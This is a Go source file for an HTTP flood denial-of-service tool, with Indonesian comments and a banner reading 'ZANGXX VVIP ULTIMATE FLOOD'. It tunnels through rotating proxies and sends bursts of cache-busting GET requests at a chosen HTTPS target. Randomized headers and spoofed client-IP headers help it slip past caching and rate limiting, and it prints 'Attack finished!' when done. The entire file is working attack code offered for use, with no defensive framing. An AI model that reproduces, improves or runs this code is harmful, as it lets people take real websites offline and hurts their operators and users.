package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	targetURL   *url.URL
	durationSec int
	threads     int
	proxyList   []string
	stopFlag    bool
	wg          sync.WaitGroup
	rateMu      sync.Mutex
	requestCount int
)

var acceptHeaders = []string{"*/*", "image/*", "text/html", "application/xhtml+xml", "application/xml"}
var encodingHeaders = []string{"gzip, deflate, br", "gzip, deflate", "gzip"}
var langHeaders = []string{"id-ID,id;q=0.9,en;q=0.8", "en-US,en;q=0.9", "en-GB,en;q=0.9"}
var cacheHeaders = []string{"no-cache", "max-age=0", "must-revalidate", "no-store"}
var referers = []string{
	"https://google.com",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://check-host.net/",
	"https://www.cloudflare.com",
}
var uaList = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/133.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/132.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/133.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) Chrome/133.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
}

var customHeaders = []map[string]string{
	{"X-Forwarded-For": "", "X-Real-IP": "", "CF-Connecting-IP": ""},
	{"X-Originating-IP": "", "X-Client-IP": "", "X-Remote-IP": ""},
	{"X-Forwarded-Host": "", "X-Forwarded-Proto": "https"},
}

func randStr(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func randomElement(list []string) string {
	return list[rand.Intn(len(list))]
}

func spoofIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
}

func readProxyFile(path string) []string {
	file, err := os.Open(path)
	if err != nil {
		fmt.Println("[!] Gagal baca proxy:", err)
		os.Exit(1)
	}
	defer file.Close()
	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}
	return proxies
}

// ===== WORKER DENGAN PIPELINE & RETRY =====
func worker(id int) {
	defer wg.Done()

	// Buat pool koneksi per worker
	connPool := make([]net.Conn, 0, 5)

	for !stopFlag {
		// Rotasi proxy
		proxyAddr := randomElement(proxyList)
		parts := strings.Split(proxyAddr, ":")
		if len(parts) < 2 {
			continue
		}
		proxyHost := parts[0]
		proxyPort, _ := strconv.Atoi(parts[1])

		// Buat koneksi baru
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", proxyHost, proxyPort), 5*time.Second)
		if err != nil {
			time.Sleep(100 * time.Millisecond)
			continue
		}

		// CONNECT request
		connectReq := fmt.Sprintf("CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\nConnection: Keep-Alive\r\n\r\n", targetURL.Host, targetURL.Host)
		conn.Write([]byte(connectReq))

		// Baca response
		respBuf := make([]byte, 1024)
		conn.SetReadDeadline(time.Now().Add(5 * time.Second))
		n, err := conn.Read(respBuf)
		if err != nil || n == 0 || !strings.Contains(string(respBuf[:n]), "200") {
			conn.Close()
			time.Sleep(100 * time.Millisecond)
			continue
		}
		conn.SetReadDeadline(time.Time{})

		// TLS
		tlsConfig := &tls.Config{
			ServerName:         targetURL.Host,
			InsecureSkipVerify: true,
			NextProtos:         []string{"h2", "http/1.1"},
			MinVersion:         tls.VersionTLS12,
		}
		tlsConn := tls.Client(conn, tlsConfig)
		err = tlsConn.Handshake()
		if err != nil {
			tlsConn.Close()
			conn.Close()
			time.Sleep(100 * time.Millisecond)
			continue
		}

		// HTTP Client
		tr := &http.Transport{
			Dial: func(network, addr string) (net.Conn, error) {
				return tlsConn, nil
			},
			ForceAttemptHTTP2: true,
			TLSClientConfig:   tlsConfig,
			MaxIdleConns:      100,
			IdleConnTimeout:   10 * time.Second,
		}
		client := &http.Client{
			Transport: tr,
			Timeout:   5 * time.Second,
		}

		// BURST REQUEST (30 request per koneksi)
		for burst := 0; burst < 30 && !stopFlag; burst++ {
			go func(b int) {
				path := targetURL.Path
				if !strings.Contains(path, "?") {
					path += "?"
				} else {
					path += "&"
				}
				path += randStr(8) + "=" + randStr(rand.Intn(20)+10) + "&_=" + fmt.Sprintf("%d", time.Now().UnixNano())

				req, _ := http.NewRequest("GET", targetURL.Scheme+"://"+targetURL.Host+path, nil)
				req.Header.Set("Accept", randomElement(acceptHeaders))
				req.Header.Set("Accept-Encoding", randomElement(encodingHeaders))
				req.Header.Set("Accept-Language", randomElement(langHeaders))
				req.Header.Set("Cache-Control", randomElement(cacheHeaders))
				req.Header.Set("Referer", randomElement(referers))
				req.Header.Set("User-Agent", randomElement(uaList))
				req.Header.Set("Sec-Fetch-Mode", randomElement([]string{"navigate", "no-cors", "cors"}))
				req.Header.Set("Sec-Fetch-Site", "cross-site")
				req.Header.Set("Sec-Fetch-Dest", "document")
				req.Header.Set("X-Forwarded-For", spoofIP())
				req.Header.Set("X-Real-IP", spoofIP())
				req.Header.Set("CF-Connecting-IP", spoofIP())
				req.Header.Set("X-Originating-IP", spoofIP())
				req.Header.Set("X-Client-IP", spoofIP())
				req.Header.Set("Connection", "keep-alive")

				resp, err := client.Do(req)
				if err == nil && resp != nil {
					resp.Body.Close()
				}
				rateMu.Lock()
				requestCount++
				rateMu.Unlock()
			}(burst)
		}

		// Biar gak terlalu cepat
		time.Sleep(10 * time.Millisecond)
	}
}

// ===== MONITOR CPU & RATE =====
func monitor() {
	ticker := time.NewTicker(1 * time.Second)
	for range ticker.C {
		if stopFlag {
			ticker.Stop()
			return
		}
		rateMu.Lock()
		count := requestCount
		requestCount = 0
		rateMu.Unlock()
		fmt.Printf("\r\033[32m[+] Requests/sec: %d\033[0m", count)
	}
}

func main() {
	if len(os.Args) < 6 {
		fmt.Println("Usage: go run main.go <target> <time> <threads> <proxy.txt>")
		fmt.Println("Example: go run main.go https://target.com 60 50 proxies.txt")
		os.Exit(1)
	}

	targetStr := os.Args[1]
	var err error
	targetURL, err = url.Parse(targetStr)
	if err != nil || targetURL.Scheme != "https" {
		fmt.Println("[!] Target harus https")
		os.Exit(1)
	}

	durationSec, _ = strconv.Atoi(os.Args[2])
	threads, _ = strconv.Atoi(os.Args[3])
	proxyFile := os.Args[4]

	proxyList = readProxyFile(proxyFile)
	if len(proxyList) == 0 {
		fmt.Println("[!] Proxy kosong")
		os.Exit(1)
	}

	rand.Seed(time.Now().UnixNano())

	fmt.Println("\033[31m============================================\033[0m")
	fmt.Printf("\033[33m[+] Target: \033[37m%s\033[0m\n", targetStr)
	fmt.Printf("\033[33m[+] Time: \033[37m%ds\033[0m\n", durationSec)
	fmt.Printf("\033[33m[+] Threads: \033[37m%d\033[0m\n", threads)
	fmt.Printf("\033[33m[+] Proxy: \033[37m%s (\033[32m%d\033[37m)\033[0m\n", proxyFile, len(proxyList))
	fmt.Println("\033[31m============================================\033[0m")
	fmt.Println("\033[35m🔥 ZANGXX VVIP ULTIMATE FLOOD 🔥\033[0m")
	fmt.Println("\033[31m============================================\033[0m")

	// Start workers
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(i)
	}

	// Monitor
	go monitor()

	// Stop after duration
	time.Sleep(time.Duration(durationSec) * time.Second)
	stopFlag = true
	wg.Wait()

	fmt.Println("\n\n\033[31m[+] Attack finished! Total request dikit ya karena proxy bermasalah\033[0m")
}